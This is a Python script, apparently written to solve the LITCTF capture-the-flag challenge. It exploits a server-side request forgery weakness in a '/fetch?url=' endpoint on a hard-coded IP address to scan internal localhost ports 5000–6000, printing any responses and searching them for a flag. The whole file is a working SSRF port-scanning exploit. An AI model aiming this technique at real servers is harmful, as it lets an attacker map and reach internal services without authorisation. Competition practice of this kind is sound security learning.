import requests
import time
import sys

TARGET = "http://136.115.87.65:31770"

print("[*] Starting port scan (5000–6000). This takes ~40 seconds...")
print("[*] Hit Ctrl+C to stop early.\n")

for port in range(5000, 6001):
    internal_url = f"http://127.0.0.1:{port}/"
    full_url = f"{TARGET}/fetch?url={internal_url}"
    
    print(f"\r[*] Scanning port {port}...", end="", flush=True)
    
    try:
        r = requests.get(full_url, timeout=1.5)
        if r.status_code == 200 and len(r.text) > 0:
            print(f"\n[+] Port {port} responded! Length: {len(r.text)}")
            print("\n--- Response ---")
            print(r.text[:600])
            print("--- End ---\n")
            
            if "flag" in r.text.lower() or "LITCTF" in r.text:
                print("🎉 Flag found! Exiting.")
                sys.exit(0)
    except requests.exceptions.Timeout:
        pass  
    except requests.exceptions.ConnectionError:
        pass  
    except Exception:
        pass  
    
    time.sleep(0.04)

print("\n[*] Scan complete. No flag found? Check the manual output above.")